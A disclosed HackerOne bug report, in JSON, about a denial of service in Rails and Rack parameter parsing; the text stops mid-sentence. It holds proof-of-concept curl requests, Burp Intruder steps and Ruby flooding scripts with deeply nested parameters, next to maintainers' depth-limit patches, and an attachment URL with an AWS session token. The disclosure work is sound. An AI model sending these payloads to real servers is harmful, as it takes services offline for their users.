{"id":42797,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80Mjc5Nw==","url":"https://hackerone.com/reports/42797","title":"Denial of Service in Action Pack Exception Handling","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-01-07T20:01:46.370Z","submitted_at":"2015-01-07T20:01:46.370Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ff7f00","url":"/ff7f00","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-06-16T21:56:27.776Z","bug_reporter_agreed_on_going_public_at":"2015-06-16T21:56:07.702Z","team_member_agreed_on_going_public_at":"2015-06-16T19:06:05.148Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Severity\r\n\r\nMedium\r\n\r\n# Impact\r\n\r\nAttackers can cause an application to be unreachable, causing a denial of service condition.\r\n\r\n# Details\r\n\r\nWhen a Rails application receives a request with either body or query parameters, these parameters are converted to a params hash. Hashes can be passed to the application in the form of user[name]=foo\u0026user[address]=bar. Action Pack will then convert this into a hash in the form of `{ user[:name] =\u003e \"foo\", user[:address] =\u003e \"bar\" }`. By passing a very large nested hash in the form of nested_hash[X1][X2]...[Xn], it is possible to create a denial of service condition in the form of a SystemStackError that is not handled properly. See the Bug Notes section on my attempt to figure out where this is occurring.\r\n\r\nThis was tested in the latest Rails 4.2.0 release with Ruby versions ruby-1.9.3-p551, 2.1.5p273, and ruby 2.2.0p0.\r\n\r\nProduction Webrick and single threaded Thin servers can be taken out with a single request. I set Burp Suite to a high number of concurrent requests and was able to get Heroku to produce a generic application unavailable message on a production application I had hosted, so Unicorn will be effected as well with workers constantly dying and being relaunched.\r\n\r\n# Bug Notes\r\n\r\nIt seems that the initial SystemStackError is thrown during normalize_encode_params(params) in actionpack/lib/action_dispatch/http/parameters.rb, Line 47. This method is then called again during the logging/creating of the exception when the logging code attempts to normalize and encode the parameters again. It's possible that a loop is being hit here every time the SystemStackError occurs.\r\n\r\nI set a byebug break point in the GET and POST methods located at actionpack/lib/action_dispatch/http/request.rb, line 299, then set 'catch SystemStackError'. The SystemStackError is raised 2 more times before finally running out of resources and hanging the process. The normalize_encode_params is a recursive method that creates a new hash in a block before calling itself so I believe a lot of resources are being allocated for this method when it gets deep into the nested hash.\r\n\r\n# Reproduction Steps\r\n\r\nFor Webrick:\r\n\r\n1. rails new dos_test\r\n2. cd dos_test\r\n3. bundle exec rails generate controller welcome index\r\n4. Uncomment the `root 'welcome#index'` line in config/routes.rb\r\n5. SECRET_KEY_BASE='foo' bundle exec rails s -e production\r\n6. Then in a separate window, run the following cURL command:\r\n\r\n```\r\ncurl -i -s -k  -X 'GET' \\\r\n-H 'Content-Type: application/x-www-form-urlencoded' \\\r\n--data-binary $'foo[a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a]=bar' \\\r\n'http://localhost:3000/'\r\n```\r\n\r\nNote that Webrick will hang and will have to be killed manually. If the Webrick server handles this level of nesting, more nesting levels can be created by adding [a] until the application hangs.\r\n\r\nIf you have any questions at all or need clarification, Iâ€™d be happy to help.","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-07-16T19:06:05.584Z","allow_singular_disclosure_after":-196890801.29455048,"singular_disclosure_allowed":true,"vote_count":7,"voters":["eveeez","cr4xerbik4sh","silv3rpoision","japz","cryptographer","amp87","7h3ma9u5"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":305450,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Tomek,\n\nOur initial thoughts are that the best fix here is to ensure that the parameter parsing doesn't recurse unbounded, perhaps a simple fix like:\n\n```ruby\ndef normalize_encode_params(params, max_depth = 15)\n  case params\n  when Hash\n    if max_depth == 0\n      raise ActionController::BadRequest, \"Excessive parameter depth\"\n    end\n    if params.has_key?(:tempfile)\n      UploadedFile.new(params)\n    else\n      params.each_with_object({}) do |(key, val), new_hash|\n        new_hash[key] = if val.is_a?(Array)\n          val.map! { |el| normalize_encode_params(el, max_depth - 1) }\n        else\n          normalize_encode_params(val, max_depth - 1)\n        end\n      end.with_indifferent_access\n    end\n  else\n    params\n  end\nend\n```\n\nI believe that there may be other exceptions which could cause the exception handling code to re-raise, however given how broken ruby can be with rescuing SystemStackErrors this seems the best fix.  How does that sound to you?","automated_response":false,"created_at":"2015-01-07T22:49:34.819Z","updated_at":"2015-01-07T22:49:34.819Z","actor":{"username":"nzkoz","cleared":false,"url":"/nzkoz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/317/11e8edc22329e340906e362e4f8d431cd6797787_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":305521,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Mike, this looks good to me. I took some time to see if I can bypass it and it seems pretty solid. I tried bypassing with different content types as well and it looks like JSON has a default max depth of 100 while XML's max depth seems to be around 300. Also I just found out XML support was dropped from core in 4.0 (good choice there). I manually  included it via actionpack-xml_parser and tested the nesting. It hung once but I was never able to reproduce it again so maybe it was a fluke of some kind. Made a quick script to try and beat it up and it wouldn't fall.\n\n```ruby\nrequire 'net/http'\n\ndef nested_xml(payload, depth)\n  return payload if depth == 0\n  nested_xml(\"\u003ca\u003e#{payload}\u003c/a\u003e\", depth-1)\nend\n\nURI_FOR_REQ = URI.parse('http://localhost:3000')\n100.times do\n  (1..315).each do |depth|\n    req = Net::HTTP.new(URI_FOR_REQ.hostname, URI_FOR_REQ.port)\n    xml_data = \"\u003csession\u003e\" + nested_xml(\"\u003ca\u003ebar\u003c/a\u003e\", depth)\n    xml_data += \"\u003cemail\u003efoo\u003c/email\u003e\u003cpassword\u003ebar\u003c/password\u003e\u003c/session\u003e\"\n\n    res = req.post(\"/login\",  xml_data, {'Content-Type' =\u003e 'text/xml', 'Content-Length' =\u003e xml_data.length.to_s })\n    puts \"Depth: #{depth}\"\n  end\nend\n```\n\nHopefully the max depth of 15 won't break any apps out there. ","automated_response":false,"created_at":"2015-01-08T01:08:29.790Z","updated_at":"2015-01-08T01:08:29.790Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":305581,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also to add a note, the original payload against webrick contained a nesting of 436 levels so maybe defaulting to the JSON max of 100 would be a bit more forgiving here?\n\nEdit: The original payload contained a few, \"just to be sure\" levels. Running Burp starting at a nesting of 1 has Webrick crashing at 344 levels. Unicorn+Nginx was able to handle twice the amount if I remember correctly.","automated_response":false,"created_at":"2015-01-08T02:12:08.610Z","updated_at":"2015-01-08T02:26:47.733Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":306035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Aren't we going to have this problem in straight rack apps?  I suspect that Rack's parameter parsing has exactly the same issue (though maybe the stack doesn't grow *as* quickly).","automated_response":false,"created_at":"2015-01-08T17:16:59.504Z","updated_at":"2015-01-08T17:16:59.504Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":306124,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yea, it looks like when testing against Sinatra, the same thing happens here although I'm seeing some interesting behavior. If i constantly repeat a request with a large nesting, Webrick will not hang. The hang seems to only occur when I ramp up the nesting. Running this simple app:\n\n```ruby\nrequire 'sinatra'\nget '/hi' do\n  \"hello\"\nend\n```\n\nIn Burp, I put the following request in Intruder:\n\nGET /hi HTTP/1.1\nHost: localhost:4567\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nfooÂ§[a]Â§=bar\n\nIn the Payloads tab:\n\n1. Under Payload Sets, et the Payload type to \"Character blocks\"\n2. Under Payload Options, set the Base string to \"[a]\"\n3. Set the Min length to 3\n4. Set the Max Length to 3000\n5. Set the Step to 3\n\nStart the Intruder run and it should hang around the 625th request. So yea, I then tried taking that 625th request and replaying it to see if it'll hang and on it's own, it won't work (whereas with Rails a single request seems to be enough). I tried changing only one of the keys in the hash on each repeated request to see if maybe this was a caching thing but that didn't do it either. Not sure why a ramp up in nesting is required here.","automated_response":false,"created_at":"2015-01-08T18:34:38.167Z","updated_at":"2015-01-08T18:34:38.167Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":312488,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, just an update on this.  I think the core issue is in Rack, and I can reproduce a system stack error with just a normal rack application.\n\nHere is the rack app:\n\n```\nrun lambda { |env|\n  req = Rack::Request.new env\n  req.params\n  [200, {}, ['hello world']]\n}\n```\n\nHere is the code I used to make the request:\n\n```ruby\nrequire 'net/http'\n\ndef depth_gen size\n  '[a]' * size\nend\n\nuri = URI(\"http://localhost:3000/\")\nresponse = Net::HTTP.post_form(uri, \"foo#{depth_gen(10000)}\" =\u003e '10')\n```\n\nI'll make a patch against Rack to fix this, then lets test agains Rails and Sinatra.\n\nOne thing I'm not totally clear on: since we actually kick off the parameter parsing much further down the Rails stack than this Rack app does means that the depth limit for Rails needs to be smaller than for just a straight Rack app.  This also depends on what middle ware the user is running (the more middleware, the smaller the supported stack).\n\nWe *might* eagerly parse the parameters, which would get rid of this variability (but I need to check).\n\nI'll update this with a proposed patch and then investigate Rails internals a bit.","automated_response":false,"created_at":"2015-01-16T20:03:42.746Z","updated_at":"2015-01-16T20:03:42.746Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":312490,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also I couldn't repro with a GET against thin because it yelled about URL length,\nbut I was still able to get the error via POST.","automated_response":false,"created_at":"2015-01-16T20:04:39.224Z","updated_at":"2015-01-16T20:04:39.224Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":314239,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nHere's my proposed patch:\n\n```diff\ndiff --git a/lib/rack/utils.rb b/lib/rack/utils.rb\nindex eea8c87..ef831cb 100644\n--- a/lib/rack/utils.rb\n+++ b/lib/rack/utils.rb\n@@ -61,12 +61,14 @@ module Rack\n \n     class \u003c\u003c self\n       attr_accessor :key_space_limit\n+      attr_accessor :param_depth_limit\n       attr_accessor :multipart_part_limit\n     end\n \n     # The default number of bytes to allow parameter keys to take up.\n     # This helps prevent a rogue client from flooding a Request.\n     self.key_space_limit = 65536\n+    self.param_depth_limit = 25\n \n     # The maximum number of parts a request can contain. Accepting too many part\n     # can lead to the server running out of file handles.\n@@ -126,7 +128,9 @@ module Rack\n     # normalize_params recursively expands parameters into structural types. If\n     # the structural types represented by two different parameter names are in\n     # conflict, a ParameterTypeError is raised.\n-    def normalize_params(params, name, v = nil)\n+    def normalize_params(params, name, v = nil, depth = Utils.param_depth_limit)\n+      raise RangeError if depth \u003c= 0\n+\n       name =~ %r(\\A[\\[\\]]*([^\\[\\]]+)\\]*)\n       k = $1 || ''\n       after = $' || ''\n@@ -146,14 +150,14 @@ module Rack\n         params[k] ||= []\n         raise ParameterTypeError, \"expected Array (got #{params[k].class.name}) for param `#{k}'\" unless params[k].is_a?(Array)\n         if params_hash_type?(params[k].last) \u0026\u0026 !params[k].last.key?(child_key)\n-          normalize_params(params[k].last, child_key, v)\n+          normalize_params(params[k].last, child_key, v, depth - 1)\n         else\n-          params[k] \u003c\u003c normalize_params(params.class.new, child_key, v)\n+          params[k] \u003c\u003c normalize_params(params.class.new, child_key, v, depth - 1)\n         end\n       else\n         params[k] ||= params.class.new\n         raise ParameterTypeError, \"expected Hash (got #{params[k].class.name}) for param `#{k}'\" unless params_hash_type?(params[k])\n-        params[k] = normalize_params(params[k], after, v)\n+        params[k] = normalize_params(params[k], after, v, depth - 1)\n       end\n \n       return params\n```\n\nIt seems to fix the stack error.  I set the max depth to 25, but we could set it to whatever.  I think this means we won't have to modify Rails to fix this.  Any comments on this patch?  If it looks good, I can package a prerelease of Rack so we can test Sinatra and Rails against the fix.","automated_response":false,"created_at":"2015-01-20T20:34:30.694Z","updated_at":"2015-01-20T20:34:30.694Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":314365,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Aaron, sorry was on vacation over the weekend. \n\n\u003e Also I couldn't repro with a GET against thin because it yelled about URL length,\n\u003e but I was still able to get the error via POST.\n\nYea, I tend to either switch the method to POST, or in the case of attacking the root of the application via GET, you can specify a content-type and length and the body parameters will be parsed regardless of HTTP method.\n\n\u003e It seems to fix the stack error. I set the max depth to 25, but we could set it to whatever. I think this\n\u003e means we won't have to modify Rails to fix this. Any comments on this patch? If it looks good, I can\n\u003e package a prerelease of Rack so we can test Sinatra and Rails against the fix.\n\nThis fix looks good to me. I can help test out the packaged prerelease. A depth of 25 seems sane to me and I don't think I've ever tested a Rails app that had anything close to that level of nesting.","automated_response":false,"created_at":"2015-01-20T22:10:38.185Z","updated_at":"2015-01-20T22:10:38.185Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":314393,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ff7f00 no problem!\n\nI've uploaded Rack 1.6.1.  I haven't tried your tests with this fix against Rails yet.  I'll try to do that after work.","automated_response":false,"created_at":"2015-01-20T22:33:49.335Z","updated_at":"2015-01-20T22:33:49.335Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":27438,"filename":"rack-1.6.1.gem","type":"application/x-tar","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/027/438/74d2b76e9f45ea50579161043e91b1285bb879ef/rack-1.6.1.gem?response-content-disposition=attachment%3B%20filename%3D%22rack-1.6.1.gem%22%3B%20filename%2A%3DUTF-8%27%27rack-1.6.1.gem\u0026response-content-type=application%2Fx-tar\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145926Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e1187373a64ee61311135a9cf39c1ad0bb16dc33851f72514c5d1b62fc19cc61"}],"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":314625,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @tenderlove. What's the most efficient way to get Rails to use this version of rack? I attempted to replace it in the gemspec for actionpack but it looks like resque requires 1.6.0. Should I pull in resque, modify the rack requirement, and rebuild from there?","automated_response":false,"created_at":"2015-01-21T04:01:01.436Z","updated_at":"2015-01-21T04:01:01.436Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":315319,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ff7f00 you should be able to just install the Rails gems as usual, then install this rack preview gem.  It should use the latest version of Rack that you have on your system when you rebundle.\n\nIOW: Install Rails per usual, install the preview release of Rack, then try `rails new`, etc.\n\nI couldn't get to this last night, so I'll try again tonight.","automated_response":false,"created_at":"2015-01-21T21:50:30.199Z","updated_at":"2015-01-21T21:50:30.199Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":331377,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Wow, I can't believe it's been a month already since I submitted this. Time is flying...\n\nAlright, so I was able to follow your instructions and get Rails to use the preview release of Rack. At 25 levels of nesting, Rack started throwing a RangeError (which is inline with the param_depth_limit set in the Utils class).\n\nHowever, it appears that there is a memory leak somewhere. If I let the attack run with an added layer of nesting on each request while analyzing the memory, it just keeps going up and never gets freed. This will continue until the server runs out of memory and hangs the process. This is running with ruby 2.2.0p0 which should be fixing any potential symbol being created and not freed via the new GC. Pausing the attack doesn't result in any memory being freed. After pausing, I replayed a single attack multiple times (with a constant nesting level) and the memory continued to be eaten up without being freed.\n\nI've got to get going at the moment but I'll try some different parameters to try and narrow down what might be causing this.","automated_response":false,"created_at":"2015-02-13T03:08:17.003Z","updated_at":"2015-02-13T03:08:17.003Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":331378,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Blech.  I'll try against a real app.  Sounds like we aren't freeing up some resources after the exception happens.  Are you running in production, or development mode?","automated_response":false,"created_at":"2015-02-13T03:10:03.185Z","updated_at":"2015-02-13T03:10:03.185Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":331708,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah good call, it looks like this happens only in development. With the production flag, the memory is stable and I let the attack run to 10,000 levels and the app didn't even flinch. JSON performed similarly with stable memory usage, the only difference was that it imposes it's own depth limit of 100 and will print the entire hash into the production log. \n\nMy attack script actually crashed with a SystemStackError at a depth of 8731 8)","automated_response":false,"created_at":"2015-02-13T18:37:53.757Z","updated_at":"2015-02-13T18:37:53.757Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":334346,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If there is anything else you guys need from me to close this out let me know.","automated_response":false,"created_at":"2015-02-18T21:52:01.224Z","updated_at":"2015-02-18T21:52:01.224Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":335068,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Not right now.  I'm testing against older versions of Rails too.  I want to make sure that this issue doesn't exist in Rails as well but in older versions.  I'll update this ticket again today with my findings, then we can get the CVE rolling.\n\nThanks so much for helping out with this!","automated_response":false,"created_at":"2015-02-19T17:10:49.382Z","updated_at":"2015-02-19T17:10:49.382Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":336174,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nI just wanted to update.  I was looking in to this more, and the patch that I proposed is not the correct fix.  People would still be vulnerable to DoS attacks.  This is actually a bug in Ruby.  Here is a script to demo the issue:\n\n```ruby\ndef normalize_encode_params(d)\n  if d == 0\n    'bar'\n  else\n    ['a'].each_with_object({}) do |key, new_hash|\n      new_hash[key] = normalize_encode_params(d - 1)\n    end\n  end\nend\n\nThread.new {\n  begin\n    begin\n      normalize_encode_params 1846\n    rescue Exception\n      normalize_encode_params 1846\n    end\n  rescue Exception\n  end\n  puts 'in thread' # never reached\n}.join\n\nputs 'after' # never reached\n```\n\nI'll coordinate with the Ruby sec team and post here when I get more 